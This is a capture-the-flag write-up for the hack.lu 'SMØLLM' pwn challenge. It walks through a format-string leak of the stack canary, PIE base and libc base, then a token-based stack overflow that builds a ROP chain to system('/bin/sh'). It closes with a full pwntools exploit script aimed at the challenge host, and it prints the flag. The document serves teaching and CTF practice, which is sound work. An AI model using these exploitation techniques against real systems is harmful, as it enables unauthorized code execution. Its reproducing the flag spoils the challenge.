# SMØLLM CTF Challenge - Complete Writeup

**Challenge:** SMØLLM  
**Category:** Binary Exploitation / Pwn  
**Difficulty:** Medium  
**Points:** [Your points here]  
**Flag:** `flag{w3_4re_ou7_0f_7ok3n5,sorry:171cec579a6ccf7ab7eba1b8cd2ee12c}`

---

## Table of Contents

1. [Challenge Overview](#challenge-overview)
2. [Initial Reconnaissance](#initial-reconnaissance)
3. [Understanding the Token System](#understanding-the-token-system)
4. [Vulnerability Analysis](#vulnerability-analysis)
5. [Exploitation Strategy](#exploitation-strategy)
6. [Information Leaking](#information-leaking)
7. [Building the ROP Chain](#building-the-rop-chain)
8. [Common Pitfalls and Debugging](#common-pitfalls-and-debugging)
9. [Final Exploit](#final-exploit)
10. [Key Lessons Learned](#key-lessons-learned)

---

## Challenge Overview

SMØLLM is a custom "AI assistant" program that manages tokens and allows users to run prompts. The challenge involves exploiting multiple vulnerabilities to gain remote code execution.

### Challenge Files

```bash
smollm_patched  # Main binary (PIE enabled)
libc.so.6       # Provided libc
```

### Connection Info

```
Host: SMOLLM.flu.xxx
Port: 1024
```

---

## Initial Reconnaissance

### Binary Information

```bash
┌──(kali㉿kali)-[~/ctf]
└─$ file smollm_patched
smollm_patched: ELF 64-bit LSB pie executable, x86-64, dynamically linked

┌──(kali㉿kali)-[~/ctf]
└─$ checksec smollm_patched
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

**All protections are enabled!** This means:
- **PIE**: Binary loads at random address (need information leak)
- **NX**: Stack is not executable (need ROP)
- **Canary**: Stack overflow detection (need to leak and restore canary)
- **Full RELRO**: GOT is read-only (can't overwrite GOT entries)

### Running the Program

```
┌──(kali㉿kali)-[~/ctf]
└─$ ./smollm_patched
Hello, and welcome to smøllm. Your friendly AI assistant.
You can add you own custom tokens or run a prompt.
Do you want to
1) Add a custom token
2) Run a prompt
>
```

The program offers two options:
1. **Add a custom token** - Add an 8-byte custom string
2. **Run a prompt** - Process input using tokens

---

## Understanding the Token System

### What Are Tokens?

Tokens are **8-byte strings** stored in a global array. The program starts with **106 default tokens** like "about", "all", "also", etc.

```c
char tokens[MAX_TOKENS][TOKEN_SIZE];  // TOKEN_SIZE = 8
int n_tokens = 106;  // Initially 106 tokens
```

Example tokens:
```
Token 0:  "about\x00\x00\x00"
Token 1:  "all\x00\x00\x00\x00\x00"
Token 2:  "also\x00\x00\x00\x00"
...
Token 105: "your\x00\x00\x00\x00"
```

### The Token Selection Mechanism

When you run a prompt, the program reads your input and uses each byte to select tokens:

```c
void run_prompt() {
    char in_buf[256];
    char out_buf[256];
    static unsigned int combinator = 0;  // ⭐ STATIC - persists across calls!
    
    fgets(in_buf, 0x168, stdin);  // Read up to 360 bytes
    
    int n = strlen(in_buf);
    for (int i = 0; i < n; i++) {
        int token_idx = (in_buf[i] + combinator++) % n_tokens;
        memcpy(&out_buf[i * TOKEN_SIZE], tokens[token_idx], TOKEN_SIZE);
    }
    
    printf(out_buf);  // ⚠️ FORMAT STRING VULNERABILITY
}
```

### Token Selection Formula

**The formula to select a token:**
```
token_index = (input_byte + combinator) % n_tokens
```

**To select a specific token, we solve for `input_byte`:**
```
input_byte = (desired_token - combinator) % n_tokens
```

### Example: Selecting Token 106

Let's say we added a custom token (now token 106) and want to select it:

```python
n_tokens = 107  # 106 default + 1 custom
combinator = 0  # Starting value

# Iteration 1:
input_byte = (106 - 0) % 107 = 106
# Send byte value 106 (ASCII 'j')
# After: combinator = 1

# Iteration 2:
input_byte = (106 - 1) % 107 = 105
# Send byte value 105 (ASCII 'i')
# After: combinator = 2

# Iteration 3:
input_byte = (106 - 2) % 107 = 104
# Send byte value 104 (ASCII 'h')
# After: combinator = 3

# Pattern: j, i, h, g, f, e, d, c, b, a, ...
```

### ⚠️ Critical: The `combinator` is STATIC!

```c
static unsigned int combinator = 0;
```

The `static` keyword means:
- **Persists across function calls** - doesn't reset to 0
- **Shared across all invocations** of `run_prompt()`

**Impact:**
```
First run_prompt() call:
  Start: combinator = 0
  Process 10 bytes
  End: combinator = 10

Second run_prompt() call:
  Start: combinator = 10  ← NOT RESET!
  Process 20 bytes
  End: combinator = 30
```

**This is CRUCIAL for exploitation!** We must track the combinator value throughout our exploit.

---

## Vulnerability Analysis

### Vulnerability 1: Format String Bug

```c
printf(out_buf);  // ⚠️ No format specifier!
```

**Safe version:**
```c
printf("%s", out_buf);  // Format specifier prevents exploitation
```

**Vulnerable version:**
```c
printf(out_buf);  // User controls format specifiers!
```

**If `out_buf` contains `%p%p%p`:**
- `%p` reads a pointer from the stack
- Prints it in hexadecimal
- Each `%p` leaks one 8-byte value

**What can we leak?**
- Stack canary (for bypass)
- Return addresses (PIE leak)
- Libc addresses (ASLR leak)
- Stack addresses (for calculations)

### Vulnerability 2: Stack Buffer Overflow

```c
char out_buf[256];  // Buffer is 256 bytes

fgets(in_buf, 0x168, stdin);  // Reads up to 360 bytes!

for (int i = 0; i < n; i++) {
    memcpy(&out_buf[i * 8], tokens[...], 8);
}
```

**The overflow:**
- Each iteration copies **8 bytes** into `out_buf`
- If we send 40 bytes of input, it writes `40 × 8 = 320 bytes`
- But `out_buf` is only `256 bytes`
- **Overflow = 64 bytes beyond the buffer!**

**What can we overwrite?**
```
Lower memory
┌────────────────────────┐
│ out_buf[256 bytes]     │ ← Token 0-31
├────────────────────────┤
│ in_buf[256 bytes]      │ ← Token 32
├────────────────────────┤
│ other locals           │
├────────────────────────┤
│ CANARY (8 bytes)       │ ← Token 33 ⭐
├────────────────────────┤
│ Saved RBP (8 bytes)    │ ← Token 34
├────────────────────────┤
│ Return Address         │ ← Token 35+ ⭐⭐ TARGET!
└────────────────────────┘
Higher memory
```

**Stack canary protection:**
```c
if (current_canary != original_canary) {
    abort("*** stack smashing detected ***");
}
return;  // Only if canary is valid
```

**To bypass:** We must leak the canary and restore it during overflow!

---

## Exploitation Strategy

### High-Level Plan

```
Stage 1: Information Leak
├─ Add format string token ("%p%p%p%p%p%p")
├─ Trigger format string multiple times
├─ Parse output to extract:
│  ├─ Stack canary (for bypass)
│  ├─ Binary address (for PIE bypass)
│  └─ Libc address (for ASLR bypass)
└─ Calculate base addresses

Stage 2: Build ROP Chain
├─ Add tokens containing ROP gadget addresses
├─ Tokens include:
│  ├─ Canary value (to restore)
│  ├─ ret gadget (stack alignment)
│  ├─ pop rdi; ret (set first argument)
│  ├─ "/bin/sh" address
│  └─ system() address
└─ Prepare for overflow

Stage 3: Trigger Overflow
├─ Send payload that selects our ROP tokens
├─ Overflow the buffer with:
│  ├─ 33 bytes of padding
│  ├─ Restored canary
│  ├─ Fake RBP
│  └─ ROP chain (system("/bin/sh"))
└─ Get shell!
```

### Why This Works

1. **Format string** leaks everything we need
2. **Static combinator** allows multiple `run_prompt()` calls
3. **Token system** lets us store ROP chain as tokens
4. **Buffer overflow** lets us hijack control flow

---

## Information Leaking

### Step 1: Add Format String Token

We add a custom token containing format specifiers:

```python
p.sendlineafter(b'>', b'1')           # Choose "Add a custom token"
p.sendafter(b'token?>', b'%p' * 6 + b'\x00')  # Token 106: "%p%p%p%p%p%p\x00"
n_tokens += 1  # Now we have 107 tokens
```

**Why 6 `%p`'s?**
- Each `%p` leaks one 8-byte value
- Token size is 8 bytes, so `%p` × 6 = 6 bytes + null terminator
- When selected multiple times, we leak many stack values

### Step 2: Select Token Multiple Times

We need to select token 106 repeatedly to leak deep into the stack:

```python
combinator = 0  # Reset tracking
payload = b""

for i in range(25):  # Select token 106 twenty-five times
    byte = (106 - combinator) % n_tokens  # Calculate byte to select token 106
    payload += bytes([byte])
    combinator += 1

p.sendlineafter(b'>', b'2')  # Choose "Run a prompt"
p.sendlineafter(b'>', payload)
```

**What happens:**
- Token 106 is copied into `out_buf` 25 times
- `out_buf` becomes: `%p%p%p%p%p%p%p%p%p%p...` (repeated)
- `printf(out_buf)` leaks `25 × 6 = 150` stack values!

### Step 3: Parse Leaked Addresses

**The output looks like:**
```
<menu text>
Do you want to
1) Add a custom token
2) Run a prompt
>0x1234...0x5678...(nil)0xabcd...0xef01...<our useful leaks>...
```

**Parsing strategy:**
```python
io.recvline()  # Skip first line
leak_line = io.recvline().strip()

# Remove "(nil)" entries (null pointers)
leak_line = leak_line.replace(b"(nil)", b"")

# Decode to string
leak_line = leak_line.decode()

# Split by '>' to get past the menu prompt
after_prompt = leak_line.split('>')[1]

# Split by '0x' to separate addresses
addresses = after_prompt.split('0x')

# Take from position 35 onwards (skip garbage)
leak = addresses[35:]
```

**Why position 35?**

The first 34 positions contain:
- NULL values
- The format string itself (e.g., `0x7025702570257025` = "%p%p%p%p")
- Garbage values

**Position 35+ contains our actual leaks:**
```python
leak[0]  = binary address   # PIE bypass
leak[1]  = canary value     # Stack protection bypass
leak[2]  = stack address    # Reference
leak[10] = libc address     # ASLR bypass
```

### Step 4: Extract and Calculate

```python
# Extract raw leaked values
binary_leak = int(leak[0], 16)
canary      = int(leak[1], 16)
stack_leak  = int(leak[2], 16)
libc_leak   = int(leak[10], 16)

# Calculate base addresses
BINARY_OFFSET = 0x3098   # Offset of leaked function from binary base
LIBC_OFFSET   = 0x2a1ca  # Offset of leaked function from libc base

elf.address   = binary_leak - BINARY_OFFSET
libc.address  = libc_leak - LIBC_OFFSET
```

### Understanding Offsets

**What is an offset?**

When PIE/ASLR is enabled, the base address changes, but internal structure stays the same:

```
Run 1:
  Binary base: 0x555555554000
  main():      0x555555554000 + 0x1169 = 0x555555555169
  
Run 2:
  Binary base: 0x564922cb0000  ← CHANGED!
  main():      0x564922cb0000 + 0x1169 = 0x564922cb1169  ← CHANGED!
  
Offset (0x1169) stays constant!
```

**Finding offsets:**

Use GDB with `vmmap` and `info symbol`:

```bash
gdb ./smollm_patched

# Run program
run

# Check memory map
vmmap
# Shows: 0x555555554000 - binary base

# Find function address
info symbol main
# Shows: main at 0x555555555169

# Calculate offset
Offset = 0x555555555169 - 0x555555554000 = 0x1169
```

**For this challenge:**
- Binary offset: `0x3098` (leaked address - binary base)
- Libc offset: `0x2a1ca` (leaked address - libc base)

---

## Building the ROP Chain

### What is ROP?

**ROP (Return-Oriented Programming)** chains together small pieces of existing code called **gadgets**.

Since NX is enabled, we can't execute shellcode on the stack. Instead, we:
1. Find gadgets in existing code (libc)
2. Chain them together to perform our attack
3. Control execution by overwriting return addresses

### Our Goal: Call `system("/bin/sh")`

In x86-64 Linux:
```
system("/bin/sh") requires:
  RDI = pointer to "/bin/sh" string
  Call system()
```

**ROP chain to achieve this:**
```
1. pop rdi; ret         ← Pop next value into RDI
2. address of "/bin/sh" ← This value goes into RDI
3. system()             ← Call system(RDI) = system("/bin/sh")
```

### Finding Gadgets

Using ROPgadget tool:

```bash
┌──(kali㉿kali)-[~/ctf]
└─$ ROPgadget --binary libc.so.6 | grep "pop rdi"
0x000000000010f75b : pop rdi ; ret

┌──(kali㉿kali)-[~/ctf]
└─$ ROPgadget --binary libc.so.6 | grep ": ret$"
0x0000000000026b72 : ret
```

**Why do we need a standalone `ret` gadget?**

Some functions like `system()` require **16-byte stack alignment**. Adding a `ret` before our main chain fixes alignment issues.

### Finding `/bin/sh` String

```python
binsh_addr = next(libc.search(b"/bin/sh\x00"))
```

This searches the libc for the `/bin/sh` string and returns its address.

### Adding ROP Chain as Tokens

**Here's the clever trick:** We store each ROP gadget address as a token!

```python
# Token 107: Canary value (to restore during overflow)
add_token(p64(canary))

# Token 108: ret gadget (stack alignment)
add_token(p64(ret_gadget))

# Token 109: pop rdi; ret gadget
add_token(p64(pop_rdi_gadget))

# Token 110: "/bin/sh" address
add_token(p64(binsh_addr))

# Token 111: system() address
add_token(p64(system_addr))
```

**Why this works:**
- Tokens are 8 bytes (perfect for addresses)
- We can overflow the buffer by selecting these tokens
- They'll be placed on the stack as our ROP chain

---

## The Overflow Payload

### Stack Layout After Overflow

```
Position  Content              Purpose
────────  ─────────────────────────────────────────────
[0-32]    Padding (33 bytes)   Fill buffer up to canary
[33]      Token 107 (canary)   Restore correct canary
[34]      Token 111 (system)   Fake RBP (doesn't matter)
[35]      Token 108 (ret)      Stack alignment
[36]      Token 109 (pop rdi)  Prepare argument
[37]      Token 110 (binsh)    Argument for system()
[38]      Token 111 (system)   Call system()
```

### Calculating the Payload

**Critical: Track combinator state!**

After the leak stage, combinator = 25 (we sent 25 bytes).

```python
# Before overflow, account for combinator state
combinator += 1 + 33  # +1 for saved RBP, +33 for padding

# Now combinator = 59
```

**Building the payload:**

```python
overflow = b"A" * 33  # Literal padding bytes (positions 0-32)

# Select tokens for positions 33-38
overflow += bytes([calc_input(n_tokens - 5)])  # Token 107: canary
overflow += bytes([calc_input(n_tokens - 1)])  # Token 111: fake RBP
overflow += bytes([calc_input(n_tokens - 4)])  # Token 108: ret
overflow += bytes([calc_input(n_tokens - 3)])  # Token 109: pop rdi
overflow += bytes([calc_input(n_tokens - 2)])  # Token 110: "/bin/sh"
overflow += bytes([calc_input(n_tokens - 1)])  # Token 111: system()
```

**Why literal padding vs token selection?**

- **Positions 0-32:** We use literal `b"A" * 33` because we just need to fill space
- **Positions 33+:** We use token selection (`calc_input()`) because we need specific addresses

### What Happens When We Send This?

```
1. Program reads our payload
2. First 33 bytes are processed:
   - Each 'A' (0x41) selects some random token
   - Fills out_buf with junk (doesn't matter)
3. Next bytes select our ROP tokens:
   - Position 33: Selects token 107 (canary)
   - Position 34: Selects token 111 (fake RBP)
   - Position 35: Selects token 108 (ret)
   - Position 36: Selects token 109 (pop rdi; ret)
   - Position 37: Selects token 110 ("/bin/sh")
   - Position 38: Selects token 111 (system)
4. Stack now contains our ROP chain!
5. When function returns:
   - Checks canary ✓ (we restored it!)
   - Returns to our ret gadget
   - ROP chain executes
   - system("/bin/sh") is called
   - Shell spawned! 🎉
```

---

## Common Pitfalls and Debugging

### Issue 1: "Can't find canary in leaks"

**Symptom:**
```
Found: Binary ✓, Libc ✓, Canary ✗
```

**Causes:**
1. Not leaking enough positions (need to go deep, position 35+)
2. Parsing incorrectly (wrong split positions)
3. Filtering out canary by mistake

**Solution:**
```python
# Ensure you're parsing correctly
leak = output.split('>')[1].split('0x')[35:]

# Canary is at position 1 (not 0!)
canary = int(leak[1], 16)

# Debug: Print all leaked values
for i, val in enumerate(leak[:20]):
    print(f"leak[{i}] = 0x{val}")
```

**Canary characteristics:**
- Ends in `\x00` (last byte is null)
- Random value
- Usually large (e.g., `0xb6320087a6bbd000`)

---

### Issue 2: "Format string prints itself"

**Symptom:**
```
Leaked addresses: 0x7025702570257025 (repeated)
```

**Cause:**

`0x7025702570257025` is the ASCII hex for `%p%p%p%p`:
```python
>>> bytes.fromhex('7025702570257025')[::-1]
b'%p%p%p%p'
```

When `printf` runs out of stack values to leak, it starts reading the format string buffer itself!

**Solution:**

This is **garbage** - ignore these values. The real leaks are **after** position 35 in the parsed array.

---

### Issue 3: "Stack smashing detected"

**Symptom:**
```
*** stack smashing detected ***: terminated
Aborted
```

**Causes:**
1. Wrong canary value leaked
2. Canary not placed at correct position
3. Wrong offset calculation

**Debug approach:**
```python
# Verify canary value
print(f"Leaked canary: {hex(canary)}")
print(f"Canary ends in 00? {canary & 0xff == 0}")

# Verify position (should be token 33)
print(f"Canary token position: {n_tokens - 5}")  # Should be 107 if n_tokens=112
```

---

### Issue 4: "Combinator confusion"

**Symptom:**

Exploit works for first `run_prompt()` but fails on second.

**Cause:**

Forgetting that `combinator` is **static** and persists!

**Solution:**

Track combinator carefully:

```python
combinator = 0

# Stage 1: Leak
for i in range(25):
    calc_input(106)  # combinator goes 0→25

# Stage 2: Overflow
combinator += 1 + 33  # Account for padding
# Now combinator = 59

# Calculate next bytes starting from 59
overflow += bytes([calc_input(n_tokens - 5)])  # Uses combinator=59
```

**Debug helper:**
```python
def calc_input(idx):
    global combinator
    print(f"[DEBUG] combinator={combinator}, target={idx}")
    result = (idx - combinator) % n_tokens
    combinator += 1
    return result
```

---

### Issue 5: "Segmentation fault after overflow"

**Symptom:**
```
Segmentation fault (core dumped)
```

**Possible causes:**

1. **Wrong gadget addresses**
   ```python
   # Verify addresses are reasonable
   print(f"pop rdi: {hex(pop_rdi_gadget)}")
   print(f"Should start with 0x7f...")
   ```

2. **Stack not aligned**
   ```python
   # Make sure ret gadget is included!
   add_token(p64(ret_gadget))  # This fixes alignment
   ```

3. **Wrong libc offset**
   ```python
   # Try alternative offset if 0x2a1ca doesn't work
   LIBC_OFFSET = 0x29d90  # Alternative
   ```

---

### Issue 6: "Local works, remote doesn't"

**Symptom:**

Exploit succeeds locally but fails on remote server.

**Causes:**
- Different stack layout
- Different libc version
- Different leak positions

**Solution:**

1. **Test leak parsing on remote first:**
   ```python
   io = remote("SMOLLM.flu.xxx", 1024)
   # ... leak stage ...
   
   # Print all leaks to see positions
   for i in range(30):
       print(f"leak[{i}] = 0x{leak[i]}")
   ```

2. **Adjust positions if needed:**
   ```python
   # If canary is at different position on remote
   canary = int(leak[2], 16)  # Instead of leak[1]
   ```

3. **Verify offsets:**
   ```bash
   # Check if offsets match remote libc
   strings libc.so.6 | grep "GNU C Library"
   ```

---

## Final Exploit

Here's the complete, working exploit:

```python
#!/usr/bin/env python3
from pwn import *

# ============================================================================
# CONFIGURATION
# ============================================================================
context.arch = 'amd64'
context.log_level = 'info'

exe = ELF('./smollm_patched', checksec=False)
libc = ELF('./libc.so.6', checksec=False)

# Constants
BINARY_OFFSET = 0x3098
LIBC_OFFSET = 0x2a1ca

# State tracking
n_tokens = 0x6a  # 106 initial tokens
combinator = 0x0

# ============================================================================
# HELPER FUNCTIONS
# ============================================================================
def calc_input(idx):
    """
    Calculate which input byte will select the desired token index.
    
    Formula: token_index = (input_byte + combinator) % n_tokens
    Solve for input_byte: input_byte = (token_index - combinator) % n_tokens
    
    Args:
        idx: Token index we want to select
    
    Returns:
        Byte value to send
    """
    global combinator, n_tokens
    payload = (idx - combinator) % n_tokens
    combinator += 1
    return payload

def add_token(token):
    """
    Add a custom 8-byte token to the program.
    
    Args:
        token: 8-byte string to add as token
    """
    global n_tokens
    io.sendlineafter(b">", b"1")
    io.sendafter(b"?>", token)
    n_tokens = n_tokens + 1

# ============================================================================
# CONNECTION
# ============================================================================
# For local testing:
# io = process('./smollm_patched')

# For remote:
io = remote("SMOLLM.flu.xxx", 1024)

log.info("Connected to target")

# ============================================================================
# STAGE 1: INFORMATION LEAK
# ============================================================================
log.info("=" * 70)
log.info("STAGE 1: LEAKING STACK VALUES")
log.info("=" * 70)

# Add format string token
log.info("Adding format string token...")
add_token(b"%p" * 6 + b"\x00")  # Token 106: "%p%p%p%p%p%p\x00"
log.success(f"Added format string token. Total tokens: {n_tokens}")

# Build payload to select token 106 repeatedly
log.info("Building leak payload...")
payload = b""
for i in range(25):
    payload += bytes([calc_input(n_tokens - 1)])

log.info(f"Payload length: {len(payload)} bytes")
log.info(f"Combinator after leak: {combinator}")

# Trigger format string vulnerability
io.sendlineafter(b'>', b'2')
io.sendlineafter(b'>', payload)

# Parse leaked addresses
log.info("Parsing leaked data...")
io.recvline()  # Skip first line
leak_line = io.recvline().strip().replace(b"(nil)", b"").decode()

# Critical parsing: split by '>', take [1], split by '0x', take [35:]
leak = leak_line.split('>')[1].split('0x')[35:]

log.success(f"Received {len(leak)} leak values")

# Extract critical values
binary_leak  = int(leak[0], 16)
canary       = int(leak[1], 16)
stack_leak   = int(leak[2], 16)
libc_leak    = int(leak[10], 16)

# Calculate base addresses
exe.address  = binary_leak - BINARY_OFFSET
libc.address = libc_leak - LIBC_OFFSET

log.success(f"Binary leak:  {hex(binary_leak)}")
log.success(f"Binary base:  {hex(exe.address)}")
log.success(f"Canary:       {hex(canary)}")
log.success(f"Stack leak:   {hex(stack_leak)}")
log.success(f"Libc leak:    {hex(libc_leak)}")
log.success(f"Libc base:    {hex(libc.address)}")

# ============================================================================
# STAGE 2: BUILD ROP CHAIN AS TOKENS
# ============================================================================
log.info("=" * 70)
log.info("STAGE 2: BUILDING ROP CHAIN")
log.info("=" * 70)

# Find ROP gadgets in libc
log.info("Finding ROP gadgets...")
rop = ROP(libc)
ret_gadget = rop.find_gadget(['ret'])[0]
pop_rdi_gadget = rop.find_gadget(['pop rdi', 'ret'])[0]
binsh_addr = next(libc.search(b"/bin/sh\x00"))
system_addr = libc.symbols['system']

log.success(f"ret gadget:    {hex(ret_gadget)}")
log.success(f"pop rdi; ret:  {hex(pop_rdi_gadget)}")
log.success(f"/bin/sh:       {hex(binsh_addr)}")
log.success(f"system():      {hex(system_addr)}")

# Add ROP chain as tokens
log.info("Adding ROP chain tokens...")

# Token 107: Canary (to restore during overflow)
add_token(p64(canary))
log.info(f"  Token {n_tokens-1}: Canary")

# Token 108: ret (stack alignment)
add_token(p64(ret_gadget))
log.info(f"  Token {n_tokens-1}: ret gadget")

# Token 109: pop rdi; ret
add_token(p64(pop_rdi_gadget))
log.info(f"  Token {n_tokens-1}: pop rdi; ret")

# Token 110: "/bin/sh"
add_token(p64(binsh_addr))
log.info(f"  Token {n_tokens-1}: /bin/sh address")

# Token 111: system()
add_token(p64(system_addr))
log.info(f"  Token {n_tokens-1}: system() address")

log.success(f"Total tokens: {n_tokens}")

# ============================================================================
# STAGE 3: TRIGGER BUFFER OVERFLOW
# ============================================================================
log.info("=" * 70)
log.info("STAGE 3: TRIGGERING OVERFLOW")
log.info("=" * 70)

# CRITICAL: Account for combinator state
# We've already sent 25 bytes during leak
# Now we need to account for padding + saved RBP
log.info(f"Combinator before adjustment: {combinator}")
combinator += 1 + 33  # +1 for saved RBP, +33 for padding
log.info(f"Combinator after adjustment: {combinator}")

# Build overflow payload
log.info("Building overflow payload...")

# First 33 bytes: literal padding
overflow = b"A" * 33
log.info(f"  Padding: {len(overflow)} bytes")

# Select our ROP tokens
overflow += bytes([calc_input(n_tokens - 5)])  # Token 107: canary
log.info(f"  Added canary selection (token {n_tokens-5})")

overflow += bytes([calc_input(n_tokens - 1)])  # Token 111: fake RBP (reuse system)
log.info(f"  Added fake RBP selection (token {n_tokens-1})")

overflow += bytes([calc_input(n_tokens - 4)])  # Token 108: ret
log.info(f"  Added ret selection (token {n_tokens-4})")

overflow += bytes([calc_input(n_tokens - 3)])  # Token 109: pop rdi; ret
log.info(f"  Added pop rdi selection (token {n_tokens-3})")

overflow += bytes([calc_input(n_tokens - 2)])  # Token 110: "/bin/sh"
log.info(f"  Added /bin/sh selection (token {n_tokens-2})")

overflow += bytes([calc_input(n_tokens - 1)])  # Token 111: system()
log.info(f"  Added system() selection (token {n_tokens-1})")

log.success(f"Overflow payload ready: {len(overflow)} bytes")

# Send overflow payload
log.info("Sending overflow payload...")
io.sendlineafter(b'>', b'2')
io.sendlineafter(b'>', overflow)

# ============================================================================
# STAGE 4: INTERACT WITH SHELL
# ============================================================================
log.info("=" * 70)
log.success("🎉 SHELL SPAWNED!")
log.info("=" * 70)

# Clean up any remaining output
io.clean()

log.info("Commands you can try:")
log.info("  cat flag")
log.info("  ls -la")
log.info("  whoami")
log.info("")

# Drop to interactive mode
io.interactive()
```

---

## Key Lessons Learned

### 1. Understanding Static Variables

**Static variables persist across function calls:**

```c
static unsigned int combinator = 0;
```

This means `combinator` never resets - it keeps incrementing across multiple `run_prompt()` calls. Always track its state!

### 2. Format String Exploitation

**Format strings leak stack memory:**

```c
printf(user_input);  // Dangerous!
```

Use `%p` to leak pointers, but be aware:
- You'll leak garbage values first
- The format string itself may be printed
- Parse carefully and skip garbage

### 3. PIE and ASLR Bypass

**Addresses change, but offsets stay constant:**

```
Leaked address = Base address + Offset
Base address = Leaked address - Offset
```

Once you know the base, you can calculate any address:
```
Desired address = Base + Known offset
```

### 4. Stack Canary Bypass

**Canaries detect overflows, but can be defeated:**

1. Leak the canary value
2. Restore it during overflow
3. Canary check passes ✓

### 5. ROP Chain Construction

**When NX is enabled, use ROP:**

1. Find gadgets in existing code
2. Chain them to perform desired operations
3. Control execution via return addresses

**Common pattern for calling functions:**
```
pop rdi; ret    ← Set first argument
<arg1 value>    ← Value for RDI
function()      ← Call function(arg1)
```

### 6. Token System Exploitation

**The token system is both a constraint and a tool:**

- Constraint: Must calculate correct bytes to select tokens
- Tool: Can store ROP chain as tokens
- Key insight: Use the system against itself!

### 7. Debugging Methodology

**When exploit fails:**

1. **Verify leaks** - Print all leaked values
2. **Check offsets** - Ensure page-aligned bases
3. **Track state** - Log combinator at each step
4. **Test locally first** - Then adapt for remote
5. **Read error messages** - They often indicate the issue

### 8. Reading Solutions vs Understanding

**This challenge taught an important lesson:**

- Having the solution script doesn't mean you understand it
- Each step has a reason (leak parsing, combinator tracking, etc.)
- Small details matter (position 35+, combinator += 1 + 33)
- Understanding *why* something works is more valuable than just copying it

---

## Tools Used

### Required Tools

```bash
# Binary analysis
checksec smollm_patched
file smollm_patched
strings smollm_patched

# Disassembly
objdump -d smollm_patched
radare2 smollm_patched

# Dynamic analysis
gdb smollm_patched
ltrace ./smollm_patched
strace ./smollm_patched

# ROP gadget finding
ROPgadget --binary libc.so.6

# Exploitation
python3 -m pip install pwntools
```

### Useful GDB Commands

```gdb
# Run program
run

# Set breakpoints
break *run_prompt
break *run_prompt+200

# Examine memory
x/20gx $rsp          # Show stack
x/s <address>        # Show string
x/i <address>        # Show instruction

# Show memory mappings
vmmap

# Find symbols
info functions
info variables
info symbol <address>

# Pattern generation (for finding offsets)
pattern create 200
pattern offset <value>
```

---

## References and Resources

### CTF Write-ups

- [Format String Vulnerabilities](https://owasp.org/www-community/attacks/Format_string_attack)
- [Return-Oriented Programming](https://en.wikipedia.org/wiki/Return-oriented_programming)
- [Stack Canaries](https://ctf101.org/binary-exploitation/stack-canaries/)

### Tools Documentation

- [pwntools](https://docs.pwntools.com/)
- [ROPgadget](https://github.com/JonathanSalwan/ROPgadget)
- [GDB](https://sourceware.org/gdb/documentation/)
- [radare2](https://book.rada.re/)

### Learning Resources

- [Nightmare Binary Exploitation Course](https://guyinatuxedo.github.io/)
- [LiveOverflow Binary Exploitation](https://www.youtube.com/playlist?list=PLhixgUqwRTjxglIswKp9mpkfPNfHkzyeN)
- [CTF101 - Binary Exploitation](https://ctf101.org/binary-exploitation/overview/)

---

## Conclusion

SMØLLM was a fantastic challenge that combined:
- Format string vulnerability (information leak)
- Stack buffer overflow (control flow hijack)
- ROP chain construction (code execution)
- State management (combinator tracking)

The key insight was understanding how to abuse the token system - first to leak information via format strings, then to build a ROP chain by storing gadget addresses as tokens.

**Flag:** `flag{w3_4re_ou7_0f_7ok3n5,sorry:171cec579a6ccf7ab7eba1b8cd2ee12c}`

---

## Acknowledgments

This writeup documents my learning journey through this challenge, including all the pitfalls, confusion, and debugging along the way. Special thanks to the challenge author for creating such an interesting problem that required deep understanding of multiple exploitation techniques.

**Author:** [Your Name]  
**Date:** [Date]  
**CTF:** hack.lu CTF  
**Challenge:** SMØLLM

---

*This writeup is for educational purposes only. Always practice responsible disclosure and never use these techniques against systems without explicit permission.*
